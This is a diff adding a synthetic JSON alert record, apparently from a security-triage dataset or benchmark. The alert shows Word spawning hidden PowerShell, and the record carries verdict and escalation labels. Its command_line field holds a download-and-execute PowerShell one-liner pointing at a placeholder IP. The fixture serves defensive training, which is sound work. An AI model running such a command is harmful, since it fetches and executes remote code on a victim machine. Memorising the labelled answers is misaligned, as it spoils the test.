@@ -1,0 +1,36 @@
+{
+  "alert_id": "CHAIN-01-initial-access",
+  "source": "sysmon",
+  "rule_name": "Office application spawned a script interpreter",
+  "detected_at": "2026-03-14T12:02:00+00:00",
+  "severity": "medium",
+  "category": "endpoint",
+  "device": {
+    "hostname": "WKSTN-063",
+    "ip": "10.20.30.63",
+    "os": "Windows 11"
+  },
+  "principal": {
+    "username": "n.adeyemi",
+    "domain": "CORP"
+  },
+  "parent_process": {
+    "name": "winword.exe",
+    "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe"
+  },
+  "process": {
+    "name": "powershell.exe",
+    "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/a')"
+  },
+  "labels": {
+    "verdict": "true_positive",
+    "techniques": [
+      "T1566.001",
+      "T1059.001"
+    ],
+    "should_escalate": false,
+    "why": "On its own, a medium-severity Office-spawns-PowerShell alert that many SOCs close. It is the first link of CHAIN-01/02/03 and only reads as initial access once the other two are correlated with it.",
+    "synthetic": true
+  }
+}
